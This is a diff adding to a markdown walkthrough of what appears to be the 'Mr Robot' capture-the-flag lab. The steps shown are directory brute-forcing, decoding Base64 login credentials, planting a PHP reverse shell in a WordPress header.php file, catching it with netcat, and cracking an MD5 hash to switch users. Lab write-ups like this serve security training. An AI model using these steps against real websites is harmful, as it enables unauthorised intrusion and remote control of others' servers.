@@ -42,6 +42,88 @@ wget 10.10.144.37/fsocity.dic
 gobuster dir -u http://10.10.144.37/ -w fsocity.dic
 ```
 
+![image](https://github.com/user-attachments/assets/d634c8d3-b4d0-42ca-9bfc-eb29b404486b)
 
 
+While brute-forcing the directories using the dictionary file, we discovered some interesting files. One of them was `license`. Upon accessing the `license` directory, we found a Base64-encoded value in the source code.
+
+![image](https://github.com/user-attachments/assets/5310dbf4-f758-498f-92b0-10b39767c68d)
+
+After decoding the Base64 string, we uncovered the username and password for login.
+
+```
+echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
+```
+![image](https://github.com/user-attachments/assets/67210e9f-56d4-4a67-8159-8c0f10a94318)
+
+```
+elliot:ER28-0652
+```
+The username and password can be used to log in via the /login path, which was identified during the directory brute forcing process.
+
+![image](https://github.com/user-attachments/assets/af2185cb-1545-4870-8c1e-4956588a5b2c)
+
+![image](https://github.com/user-attachments/assets/ada544a9-71ac-4bd6-a2f5-dae38f08ca3d)
+
+Now that we are logged in, let's use the PHP reverse shell from Kali Linux. We can upload it via the Editor in the Appearance menu by editing the header.php file. This ensures that whenever the website loads, the header.php file gets executed, allowing us to establish a connection back to our machine.
+
+```
+sudo updatedb
+```
+
+```
+locate php-reverse-shell
+```
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+```
+
+![image](https://github.com/user-attachments/assets/b1622402-ae7b-4184-9ad0-591eaa7ff18d)
+
+![image](https://github.com/user-attachments/assets/721e931d-972e-4525-8332-5a77c6f892a9)
+
+![image](https://github.com/user-attachments/assets/51a7d4a4-042d-4386-a62d-1c0a817b0111)
+
+![image](https://github.com/user-attachments/assets/0a5f9734-0b18-4d24-9560-eb1a67df13ca)
+
+
+By listening on port `9001`, we successfully gained a connection when navigating to `/blog`, a page accessible only to the admin.
+
+```
+nc -nlvp 9001
+```
+
+![image](https://github.com/user-attachments/assets/3f7082ae-e5c5-414c-bb09-ed8107edc378)
+
+After spawning /bin/bash using Python, I executed ls -la to list the files in the directory. It was revealed that we were logged in as the user daemon. However, the key file was only readable by the user robot. Another file, named password.raw-md5, contained an MD5 hash value.
+
+```
+python -c 'import pty;pty.spawn("/bin/bash");'
+```
+![image](https://github.com/user-attachments/assets/a7d99a16-7623-4745-a46e-24975db52f00)
+
+![image](https://github.com/user-attachments/assets/7a0392b3-9374-43e0-9881-dab7781be9ab)
+
+```
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+Upon cracking the MD5 hash using CrackStation, the password for the robot user was discovered.
+
+![image](https://github.com/user-attachments/assets/13599298-b649-4ad0-8fb0-6f86ddf448a8)
+
+```
+abcdefghijklmnopqrstuvwxyz
+```
+After switching the user and using the discovered password, we successfully logged in as robot. 
+
+![image](https://github.com/user-attachments/assets/6e76fe37-69e4-4099-bd29-f73b35a2186d)
+
+Now that we have access as robot, we can read the key file, revealing the second flag.
+
+
+#### Privilege Escalation
+
+Upon checking the user's privileges with `sudo -l, it was identified that the user "robot" is not in the sudo group, meaning it doesn't have administrative privileges by default. This indicates that we will need to find another way to escalate privileges to gain root access.
 
